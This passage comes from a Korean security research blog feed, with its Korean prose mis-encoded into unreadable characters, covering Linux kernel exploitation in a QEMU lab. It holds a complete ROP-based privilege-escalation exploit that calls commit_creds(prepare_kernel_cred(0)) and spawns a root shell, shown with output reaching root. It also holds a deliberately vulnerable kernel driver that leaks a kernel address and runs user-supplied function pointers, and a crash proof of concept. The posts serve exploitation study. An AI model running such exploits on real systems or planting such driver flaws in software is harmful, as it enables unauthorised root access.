vmlinuxì—ì„œ ê³µê²© í˜ì´ë¡œë“œë¥¼ êµ¬ì„±í•  ê°€ì ¯ì„ ì¶”ì¶œí•  ìˆ˜ ìˆì—ˆë‹¤. ì¤‘ê°„ì— ì–¸ê¸‰í•˜ì§€ ì•Šì•˜ë˜ <b>pop rcx</b> ê°€ì ¯ì„ ì¶”ì¶œí•˜ì˜€ëŠ” ë°, í•´ë‹¹ ì´ìœ ëŠ” <b>rep movsq qword ptr [rdi], qword ptr [rsi]</b> ë‹¤ìŒì˜ ëª…ë ¹ì–´ ë•Œë¬¸ì´ë‹¤. í•´ë‹¹ ëª…ë ¹ì–´ëŠ” rsiì— ìˆëŠ” ë°ì´í„°ë¥¼ rdiì— ë³µì‚¬í•˜ëŠ” í˜•íƒœì˜ ëª…ë ¹ì–´ì´ë©° ë°˜ë³µíšŸìˆ˜ëŠ” rcx ëª…ë ¹ì–´ë¡œ ê²°ì •ëœë‹¤. ê·¸ëŸ¬ë¯€ë¡œ í•´ë‹¹ ëª…ë ¹ì–´ë¥¼ ìœ íš¨í•˜ì§€ ì•Šê²Œ í•˜ê¸° ìœ„í•´ì„œëŠ” rcxë¥¼ 0ìœ¼ë¡œ ì„¸íŒ…í•  í•„ìš”ê°€ ìˆë‹¤.</p></br><h3 id="ê³µê²©ì½”ë“œ"><a href="#ê³µê²©ì½”ë“œ" class="headerlink" title="ê³µê²©ì½”ë“œ"></a>ê³µê²©ì½”ë“œ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/stat.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;stdint.h&gt;<br><br>struct register_val &#123;<br>    uint64_t user_rip;<br>    uint64_t user_cs;<br>    uint64_t user_rflags;<br>    uint64_t user_rsp;<br>    uint64_t user_ss;<br>&#125; __attribute__((packed));<br><br>struct register_val rv;<br><br>void backup_rv(void) &#123;<br>    asm(&quot;mov rv+8, cs;&quot;<br>        &quot;pushf; pop rv+16;&quot;<br>        &quot;mov rv+24, rsp;&quot;<br>        &quot;mov rv+32, ss;&quot;<br>       );<br>&#125;<br><br>void shell() &#123;<br>    execl(&quot;/bin/sh&quot;, &quot;sh&quot;, NULL);<br>&#125;<br><br>int main() &#123;<br>    int fd;<br>    size_t rop[18] = &#123;0, &#125;;<br>    <br>    void *commit_creds = 0xffffffff8108e9f0;<br>    void *prepare_kernel_cred = 0xffffffff8108ec20;<br><br>    printf(&quot;[+] EXPLOIT!\n&quot;);<br>    fd = open(&quot;/dev/test&quot;, O_RDWR);<br>    printf(&quot;    open file /dev/test\n&quot;);<br><br>    backup_rv();<br><br>    memset(rop, 0x41, 40);<br>    rop[4] = 0xffffffff813fb9bc;    <br>    rop[5] = 0;<br>    rop[6] = prepare_kernel_cred;   // prepare_kernel_cred(0)<br>    rop[7] = 0xffffffff813f4ef2;    <br>    rop[8] = 0;<br>    rop[9] = 0xffffffff81b241f0;    <br>    rop[10] = commit_creds;         // commit_creds()  <br>    rop[11] = 0xffffffff81c00f58;   // swapgs; ret;<br>    rop[12] = 0xffffffff810252b2;   // iretq; ret;<br>    rop[13] = &amp;shell;<br>    rop[14] = rv.user_cs;<br>    rop[15] = rv.user_rflags;<br>    rop[16] = rv.user_rsp;<br>    rop[17] = rv.user_ss;<br><br>    printf(&quot;    write payload\n&quot;);<br><br>    printf(&quot;    attack device driver\n&quot;);<br>    write(fd, rop, sizeof(rop));<br>    <br><br>    close(fd);<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ê³µê²©ê²°ê³¼"><a href="#ê³µê²©ê²°ê³¼" class="headerlink" title="ê³µê²©ê²°ê³¼"></a>ê³µê²©ê²°ê³¼</h3><pre><code>qemu-system-x86_64: warning: TCG doesn&#39;t support requested feature: CPUID.01H:ECX.vmx [bit 5]/ $ whoamiuser/ $ ./exploit [+] EXPLOIT!    open file /dev/test    write payload    attack device driver/ # whoamiroot</code></pre><p></br></br></p><h2 id="ì°¸ê³ "><a href="#ì°¸ê³ " class="headerlink" title="ì°¸ê³ "></a>ì°¸ê³ </h2><pre><code>b30w0lfë‹˜ì˜ ìš´ì˜ì²´ì œ(Operating System)DREAMHACK - Linux Kernel ExploitINFLEARN - ë¦¬ëˆ…ìŠ¤ ì»¤ë„ í•´í‚¹. Aë¶€í„° Zê¹Œì§€https://www.lazenca.net/pages/viewpage.action?pageId=25624859https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame</code></pre><p></br></br></p><h2 id="í•œì¤„í‰"><a href="#í•œì¤„í‰" class="headerlink" title="í•œì¤„í‰"></a>í•œì¤„í‰</h2><p><img src="/img/rip.PNG"></p><pre><code>I&#39;ll tell you all about it when i see you again. Rest in peace.</code></pre>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>exploit</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>mitigation</tag>
      
      <tag>smep</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Linux Kernel Exploit - Bypassing KASLR</title>
    <link href="/2021/09/28/linux-kernel-exploit-bypassing-kaslr/"/>
    <url>/2021/09/28/linux-kernel-exploit-bypassing-kaslr/</url>
    
    <content type="html"><![CDATA[<h2 id="Research-Linux-Kernel-Exploit-Bypassing-KASLR"><a href="#Research-Linux-Kernel-Exploit-Bypassing-KASLR" class="headerlink" title="[Research] Linux Kernel Exploit - Bypassing KASLR"></a>[Research] Linux Kernel Exploit - Bypassing KASLR</h2><p><img src="/img/penguinshot.png"></p><h2 id="ì„œë¡ "><a href="#ì„œë¡ " class="headerlink" title="ì„œë¡ "></a>ì„œë¡ </h2><p>í•´ë‹¹ í¬ìŠ¤íŠ¸ì—ì„œëŠ” Linux Kernel Basic ì‹œë¦¬ì¦ˆì˜ ì •ë³´ë¥¼ ê¸°ë°˜ìœ¼ë¡œ í•˜ì—¬ ë¦¬ëˆ…ìŠ¤ ì»¤ë„ì— ì ìš©ë˜ì–´ ìˆëŠ” ë³´í˜¸ê¸°ë²•(mitigation)ì„ í•˜ë‚˜ì”© ìš°íšŒí•˜ì—¬ exploití•˜ëŠ” ê³¼ì •ì„ í¬ìŠ¤íŠ¸í•˜ë ¤ê³  í•œë‹¤. í•´ë‹¹ í¬ìŠ¤íŠ¸ì—ì„œëŠ” KASLRì„ ê¸°ë°˜ìœ¼ë¡œ í•˜ì—¬ Exploití•˜ëŠ” ê³¼ì •ì„ ì‘ì„±í•˜ë ¤ê³  í•œë‹¤.</p></br></br><h2 id="í™˜ê²½ë¶„ì„"><a href="#í™˜ê²½ë¶„ì„" class="headerlink" title="í™˜ê²½ë¶„ì„"></a>í™˜ê²½ë¶„ì„</h2><h3 id="start-sh"><a href="#start-sh" class="headerlink" title="start.sh"></a>start.sh</h3><pre><code>qemu-system-x86_64 \-m 512M \-kernel ./bzImage \-initrd  ./rootfs.cpio \-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \-nographic  \</code></pre><p>qemuë¥¼ ì‹¤í–‰ì‹œí‚¤ëŠ” ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚´í´ë³´ë©´ í•´ë‹¹ ì‹œìŠ¤í…œì—ëŠ” kaslrì´ ì ìš©ë˜ì–´ ìˆìœ¼ë©° ë‹¤ë¥¸ mitigationì€ ì ìš©ë˜ì–´ ìˆì§€ ì•Šë‹¤.</p></br></br><h2 id="ë°”ì´ë„ˆë¦¬-ë¶„ì„"><a href="#ë°”ì´ë„ˆë¦¬-ë¶„ì„" class="headerlink" title="ë°”ì´ë„ˆë¦¬ ë¶„ì„"></a>ë°”ì´ë„ˆë¦¬ ë¶„ì„</h2><h3 id="ë””ë°”ì´ìŠ¤-ë“œë¼ì´ë²„-ì†ŒìŠ¤ì½”ë“œ"><a href="#ë””ë°”ì´ìŠ¤-ë“œë¼ì´ë²„-ì†ŒìŠ¤ì½”ë“œ" class="headerlink" title="ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ ì†ŒìŠ¤ì½”ë“œ"></a>ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ ì†ŒìŠ¤ì½”ë“œ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;linux/input.h&gt;<br>#include &lt;linux/module.h&gt;<br>#include &lt;linux/init.h&gt;<br>#include &lt;linux/kernel.h&gt;<br>#include &lt;linux/miscdevice.h&gt;<br>#include &lt;linux/device.h&gt;<br>#include &lt;linux/slab.h&gt;<br>#include &lt;linux/uaccess.h&gt;<br><br>MODULE_LICENSE(&quot;Dual BSD/GPL&quot;);<br>MODULE_AUTHOR(&quot;SAMPLE&quot;);<br><br>static ssize_t test_read(struct file *filp, char __user *buf, size_t count, loff_t *f_pos);<br>static ssize_t test_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos);<br><br>struct file_operations test_fops = &#123;<br>    .read   = test_read,<br>    .write  = test_write,<br>&#125;;<br><br>static struct miscdevice test_driver = &#123;<br>    .minor = MISC_DYNAMIC_MINOR,<br>    .name = &quot;test&quot;,<br>    .fops = &amp;test_fops,<br>&#125;;<br><br>static ssize_t test_read(struct file *filp, char __user *buf, size_t count, loff_t *f_pos) &#123;<br>    void *ptr = &amp;printk;<br><br>    copy_to_user(buf, &amp;ptr, sizeof(ptr));<br><br>    return 0;<br>&#125;<br><br>static ssize_t test_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos) &#123;<br>    int (*fp_exec)(void) = 0; <br><br>    copy_from_user(&amp;fp_exec, buf, sizeof(fp_exec));<br><br>    fp_exec();<br><br>    return 0;<br>&#125;<br><br><br>static int test_init(void) &#123;<br>    int result;<br><br>    result = misc_register(&amp;test_driver);<br><br>    return 0;<br>&#125;<br><br>static void test_exit(void) &#123;<br>    misc_deregister(&amp;test_driver);<br>&#125;<br><br>module_init(test_init);<br>module_exit(test_exit);<br><br></code></pre></td></tr></table></figure><p>í•´ë‹¹ ì†ŒìŠ¤ì½”ë“œì˜ ê²½ìš° ê³µê²© ë²¡í„°(attack vector)ê°€ ë  ìˆ˜ ìˆëŠ” ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ íŒŒì¼ì˜ ì†ŒìŠ¤ì½”ë“œì´ë‹¤. ì†ŒìŠ¤ì½”ë“œë¥¼ í™•ì¸í•´ë³¼ ê²½ìš° file_operations êµ¬ì¡°ì²´ ë‚´ë¶€ì—ì„œ read, write ì‹œìŠ¤í…œ ì½œì— ëŒ€ì‘í•˜ëŠ” ë™ì‘ë“¤ì„ ì •ì˜í•˜ê³  ìˆë‹¤. </p><p>ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ íŒŒì¼ì„ í† ëŒ€ë¡œ read ì‹œìŠ¤í…œ ì½œì„ í˜¸ì¶œí•˜ê²Œ ë  ê²½ìš° test_read() í•¨ìˆ˜ê°€ ì‹¤í–‰ëœë‹¤. í•´ë‹¹ í•¨ìˆ˜ê°€ ì‹¤í–‰ë  ê²½ìš° printk() í•¨ìˆ˜ì˜ ì£¼ì†Œê°€ ìœ ì €ê³µê°„ì— ë³µì‚¬ëœë‹¤. ì´ë¥¼ í† ëŒ€ë¡œ ìœ ì €ê³µê°„ì˜ ì‚¬ìš©ìëŠ” printk() í•¨ìˆ˜ì˜ ì£¼ì†Œë¥¼ ì•Œ ìˆ˜ ìˆë‹¤.</p><p>ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ íŒŒì¼ì„ í† ëŒ€ë¡œ write ì‹œìŠ¤í…œ ì½œì„ í˜¸ì¶œí•˜ê²Œ ë  ê²½ìš° test_write() í•¨ìˆ˜ê°€ ì‹¤í–‰ëœë‹¤. í•´ë‹¹ í•¨ìˆ˜ê°€ ì‹¤í–‰ë  ê²½ìš° line38, line40ì—ì„œ ì‚¬ìš©ìë¡œë¶€í„° íŠ¹ì • ì£¼ì†Œë¥¼ ì „ë‹¬ë°›ê³  í•´ë‹¹ ì£¼ì†Œë¥¼ ì‹¤í–‰ì‹œí‚¤ëŠ” ë¡œì§ì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. </p></br></br><h2 id="ì·¨ì•½ì -ë¶„ì„"><a href="#ì·¨ì•½ì -ë¶„ì„" class="headerlink" title="ì·¨ì•½ì  ë¶„ì„"></a>ì·¨ì•½ì  ë¶„ì„</h2><p><b>ë°”ì´ë„ˆë¦¬ ë¶„ì„</b>ì—ì„œ ì‚¬ìš©ìì˜ ì…ë ¥ìœ¼ë¡œ ë¶€í„° ì‹¤í–‰íë¦„ì„ ë³€ì¡°í•  ìˆ˜ ìˆìŒì„ í™•ì¸í•˜ì˜€ë‹¤. í•´ë‹¹ ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ë¥¼ í† ëŒ€ë¡œ write ì‹œìŠ¤í…œ ì½œì´ í˜¸ì¶œë˜ê²Œ ë  ê²½ìš° ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ì˜ ê²½ìš° ì‚¬ìš©ìì˜ ì…ë ¥(untrusted input)ì„ ì‹¤í–‰í•˜ê²Œ ë˜ê¸° ë•Œë¬¸ì´ë‹¤. í•´ë‹¹ ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ íŒŒì¼ì— writeë¥¼ ì§„í–‰í•¨ìœ¼ë¡œì¨ ë‹¤ìŒì´ ì§„í–‰ë˜ëŠ”ì§€ í™•ì¸í•´ë³¼ í•„ìš”ê°€ ìˆë‹¤.</p></br><h3 id="ê³µê²©-ì½”ë“œ"><a href="#ê³µê²©-ì½”ë“œ" class="headerlink" title="ê³µê²© ì½”ë“œ"></a>ê³µê²© ì½”ë“œ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/stat.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;stdint.h&gt;<br><br><br>int main() &#123;<br>    int fd;<br>    void *ptr = 0x4141414141414141;<br>    <br>    fd = open(&quot;/dev/test&quot;, O_RDWR);<br><br>    write(fd, &amp;ptr, sizeof(ptr));<br><br>    close(fd);<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure><p>ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ë¥¼ ì œì–´í•˜ëŠ” ì½”ë“œë¥¼ ì‘ì„±í•˜ì˜€ë‹¤. ìœ ì €ì˜ì—­ì—ì„œ ì „ë‹¬í•˜ëŠ” ê°’ì˜ ê²½ìš°ëŠ” 0x414141414141ì´ë‹¤. ì•ì„œ ì œì‹œí•œ ì·¨ì•½í•œ ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ë¥¼ ì´ìš©í•˜ì—¬ writeë¥¼ í˜¸ì¶œí•˜ë©° 0x414141414141ì˜ ì£¼ì†Œì˜ ê²½ìš°ëŠ” ì •ìƒì ì´ì§€ ì•Šì€ ì£¼ì†Œì´ê¸° ë•Œë¬¸ì— kernel panicì´ ë°œìƒí•œë‹¤ë©´ ì‹¤í–‰íë¦„ì„ ë³€ì¡°í•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ìœ¼ë¡œ ë³¼ ìˆ˜ ìˆë‹¤.</p><h3 id="ê³µê²©-ê²°ê³¼"><a href="#ê³µê²©-ê²°ê³¼" class="headerlink" title="ê³µê²© ê²°ê³¼"></a>ê³µê²© ê²°ê³¼</h3><pre><code>qemu-system-x86_64: warning: TCG doesn&#39;t support requested feature: CPUID.01H:ECX.vmx [bit 5]/ $ ./exploit [    6.388318] general protection fault: 0000 [#1] SMP NOPTI[    6.392270] CPU: 0 PID: 69 Comm: exploit Tainted: G           O      5.8.5 #1[    6.393697] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014[    6.395480] RIP: 0010:0x4141414141414141[    6.396274] Code: Bad RIP value.[    6.396944] RSP: 0018:ffff9654c019feb8 EFLAGS: 00000246[    6.397924] RAX: 4141414141414141 RBX: 0000000000000008 RCX: 0000000000000000[    6.398380] RDX: 0000000000000000 RSI: 00007ffc01fb93a8 RDI: ffff9654c019fec8[    6.398853] RBP: ffff8cf1df9a8a00 R08: 4141414141414141 R09: 0000000000000000[    6.399308] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000000[    6.399802] R13: 0000000000000008 R14: ffff9654c019ff10 R15: 00007ffc01fb93a0[    6.400302] FS:  0000000000e4c880(0000) GS:ffff8cf1dec00000(0000) knlGS:0000000000000000[    6.400912] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033[    6.401297] CR2: 0000000000459f30 CR3: 000000001f9fc000 CR4: 00000000000006f0[    6.401865] Call Trace:[    6.404432]  ? test_write+0x32/0x50 [test][    6.409471]  ? vfs_write+0xc2/0x1f0[    6.410200]  ? ksys_write+0x5a/0xd0[    6.410888]  ? do_syscall_64+0x3e/0x70[    6.411626]  ? entry_SYSCALL_64_after_hwframe+0x44/0xa9[    6.412496] Modules linked in: test(O)[    6.414119] ---[ end trace f59244d06c1a65c1 ]---[    6.415131] RIP: 0010:0x4141414141414141[    6.415955] Code: Bad RIP value.[    6.416379] RSP: 0018:ffff9654c019feb8 EFLAGS: 00000246[    6.416846] RAX: 4141414141414141 RBX: 0000000000000008 RCX: 0000000000000000[    6.417422] RDX: 0000000000000000 RSI: 00007ffc01fb93a8 RDI: ffff9654c019fec8[    6.418102] RBP: ffff8cf1df9a8a00 R08: 4141414141414141 R09: 0000000000000000[    6.418809] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000000[    6.419337] R13: 0000000000000008 R14: ffff9654c019ff10 R15: 00007ffc01fb93a0[    6.419817] FS:  0000000000e4c880(0000) GS:ffff8cf1dec00000(0000) knlGS:0000000000000000[    6.420320] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033[    6.420804] CR2: 0000000000459f30 CR3: 000000001f9fc000 CR4: 00000000000006f0[    6.421417] Kernel panic - not syncing: Fatal exception[    6.422862] Kernel Offset: 0x2e800000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)[    6.424059] Rebooting in 1 seconds..qemu-system-x86_64: Trying to execute code outside RAM or ROM at 0x00000000afc00220This usually means one of the following happened:(1) You told QEMU to execute a kernel for the wrong machine type, and it crashed on startup (eg trying to run a raspberry pi kernel on a versatilepb QEMU machine)(2) You didn&#39;t give QEMU a kernel or BIOS filename at all, and QEMU executed a ROM full of no-op instructions until it fell off the end(3) Your guest kernel has a bug and crashed by jumping off into nowhereThis is almost always one of the first two, so check your command line and that you are using the right type of kernel for this machine.If you think option (3) is likely then you can try debugging your guest with the -d debug options; in particular -d guest_errors will cause the log to include a dump of the guest register state at this point.Execution cannot continue; stopping here.</code></pre><p>ì˜ˆìƒí–ˆë˜ ê²°ê³¼ì™€ ë™ì¼í•˜ê²Œ ì»¤ë„ íŒ¨ë‹‰(kernel panic)ì´ ë°œìƒí•˜ì˜€ìœ¼ë©° <b>RIPê°€ 0x414141414141414141ë¡œ ë³€ì¡°</b>ë˜ì—ˆìŒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</p></br></br><h2 id="ì·¨ì•½ì -ê³µê²©"><a href="#ì·¨ì•½ì -ê³µê²©" class="headerlink" title="ì·¨ì•½ì  ê³µê²©"></a>ì·¨ì•½ì  ê³µê²©</h2><p>ë¶„ì„ê³¼ì •ì„ í†µí•´ í˜„ì¬ kernel í•¨ìˆ˜ì˜ ì£¼ì†Œë¥¼ ì•Œ ìˆ˜ ìˆìœ¼ë©° ì‹¤í–‰íë¦„ì„ ë³€ì¡°í•  ìˆ˜ ìˆìŒì„ í™•ì¸í–ˆë‹¤. ì´ëŸ¬í•œ ì •ë³´ë“¤ì„ í† ëŒ€ë¡œ ê³µê²©ìì—ê²Œ ìœ ì˜ë¯¸í•œ í˜•íƒœì˜ ê³µê²©ì´ ë  ìˆ˜ ìˆë„ë¡ ì–´ë– í•œ í˜•íƒœë¡œ ê³µê²©ì„ ì§„í–‰í•  ê²ƒì¸ê°€ì— ëŒ€í•´ì„œ ì‹œë‚˜ë¦¬ì˜¤ë¥¼ ì‘ì„±í•˜ê² ë‹¤.</p><p>ê°€ì¥ íŒŒê¸‰ë ¥ìˆê³  ê³µê²©ìì—ê²Œ ììœ ë„ê°€ ë†’ì€ ë°©ë²•ì€ ë¦¬ëˆ…ìŠ¤(linux) ê¸°ë°˜ì˜ ì»¤ë„ì„ ê³µê²©í•˜ëŠ” ê²ƒì´ê¸°ì— ë£¨íŠ¸ ê¶Œí•œì˜ ì‰˜(shell)ì„ íšë“í•˜ëŠ” ê²ƒìœ¼ë¡œ ë³¼ ìˆ˜ ìˆë‹¤. ë‹¤ìŒê³¼ ê°™ì€ ê³µê²©ì´ ì´ë£¨ì–´ì§€ê¸° ìœ„í•´ì„œëŠ” ìš°ì„ ì ìœ¼ë¡œ ì§„í–‰ë˜ì–´ì•¼ í•˜ëŠ” ê²ƒì´ ìœ ì € ê¶Œí•œì„ ë£¨íŠ¸ ê¶Œí•œìœ¼ë¡œ ìƒìŠ¹(ê¶Œí•œ ìƒìŠ¹)ì„ ì¼ìœ¼ì¼œì•¼ í•œë‹¤. ë‹¤ìŒ ë‹¨ê³„ë¡œ ê³µê²©ìê°€ ì‰˜ì„ ì‚¬ìš©í•  ìˆ˜ ìˆë„ë¡ ì‰˜ì´ ì‹¤í–‰ë˜ì–´ì•¼ í•œë‹¤. ë‹¤ìŒì„ ì‹œë‚˜ë¦¬ì˜¤ë¡œ ì •ë¦¬í•´ë³´ê² ë‹¤.</p><h3 id="ê³µê²©-ì‹œë‚˜ë¦¬ì˜¤"><a href="#ê³µê²©-ì‹œë‚˜ë¦¬ì˜¤" class="headerlink" title="ê³µê²© ì‹œë‚˜ë¦¬ì˜¤"></a>ê³µê²© ì‹œë‚˜ë¦¬ì˜¤</h3><pre><code>STEP1. ì»¤ë„ ë¦­(kernel leak)ì„ í†µí•œ ê¶Œí•œìƒìŠ¹ í•¨ìˆ˜ ì£¼ì†Œ ì •ë³´ íšë“STEP2. commit_creds(prepare_kernel_cred(0))ì„ í†µí•œ ê¶Œí•œ ìƒìŠ¹STEP3. ì‚¬ìš©ì ëª¨ë“œ(user mode)ë¡œì˜ ì „í™˜STEP4. shell íšë“</code></pre><p>ë‹¤ìŒì˜ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œ ì´ì „ í¬ìŠ¤íŠ¸ì—ì„œ ì–¸ê¸‰ì„ í•˜ì§€ ì•Šì•˜ì—ˆë˜ ë¶€ë¶„ì´ ìˆë‹¤. STEP3ì— í•´ë‹¹í•˜ëŠ” ë¶€ë¶„ì´ë‹¤. ë‹¤ìŒê³¼ ê°™ì€ ê³¼ì •ì„ ìˆ˜í–‰í•˜ê²Œ ë  ê²½ìš° STEP2ë¥¼ ìˆ˜í–‰í•˜ê¸° ìœ„í•´ì„œ ì»¤ë„ ëª¨ë“œ(kernel mode)ë¡œ ì „í™˜ë  ê²ƒì´ë©° ì»¤ë„ ëª¨ë“œì—ì„œ system í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ê²Œ ë  ê²½ìš° ì»¤ë„ íŒ¨ë‹‰ì´ ë°œìƒí•œë‹¤. ê·¸ëŸ¬í•œ ì´ìœ ë¡œ ì‚¬ìš©ì ëª¨ë“œ(user mode)ë¡œì˜ ì „í™˜ì´ í•„ìš”í•œ ê²ƒì´ë‹¤. </p></br><ul><li>RIP</li><li>RSP</li><li>RFLAGS</li><li>CS</li><li>SS</li></ul></br><p>ì´ëŸ¬í•œ ê³¼ì •ì„ ìˆ˜í–‰í•˜ê¸° ìœ„í•´ì„œ ì‘ì„±í•  ìµìŠ¤í”Œë¡œì‡ ì½”ë“œì—ì„œëŠ” swapgsë¥¼ ìˆ˜í–‰í•œ í›„ iretì„ ìˆ˜í–‰í•˜ë ¤ê³  í•œë‹¤. iretë¥¼ ì‹¤í–‰í•  ê²½ìš° CPUëŠ” ìŠ¤íƒì— ì €ì¥í•´ë‘ì—ˆë˜ ê°’ì„ ì´ìš©í•˜ì—¬ ì‹¤í–‰ ìƒíƒœë¥¼ ë³µêµ¬í•œë‹¤. ì´ ë•Œì˜ ì €ì¥í•´ì•¼ í•˜ëŠ” ì •ë³´ëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤. í•´ë‹¹ ë ˆì§€ìŠ¤í„°ë¥¼ ì €ì¥í•´ë‘ë©° ë³µêµ¬í•˜ì—¬ ì‚¬ìš©ìëª¨ë“œë¡œ ì „í™˜í•˜ëŠ” í˜•íƒœì˜ ì½”ë“œë„ í¬í•¨ë˜ì–´ì•¼ í•œë‹¤.</p></br><p>ë˜í•œ ë””ë°”ì´ìŠ¤ íŒŒì¼ì— read()ë¥¼ í†µí•´ì„œ printk() í•¨ìˆ˜ì˜ ì£¼ì†Œë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆë‹¤. í•´ë‹¹ ì£¼ì†Œë¥¼ í†µí•´ ì»¤ë„ ë² ì´ìŠ¤(kernel base)ë¥¼ í™•ì¸í•  ê²½ìš° 0xbedb9 offsetë§Œí¼ ë–¨ì–´ì§„ í˜•íƒœë¥¼ ë³´ì¸ë‹¤. ê²°ê³¼ì ìœ¼ë¡œ kernel baseì˜ ì£¼ì†ŒëŠ” &amp;printk() - 0xbedb9ì´ë‹¤. ì»¤ë„ ë² ì´ìŠ¤ ì£¼ì†Œë¥¼ í†µí•´ì„œ commit_credsì˜ ì£¼ì†Œì™€ prepare_kernel_credì˜ ì£¼ì†Œë¥¼ êµ¬í•  ìˆ˜ ìˆìœ¼ë©° ì´ë¥¼ í†µí•´ ê¶Œí•œìƒìŠ¹ì„ ì¼ìœ¼í‚¬ ìˆ˜ ìˆë‹¤. ì´ëŸ¬í•œ 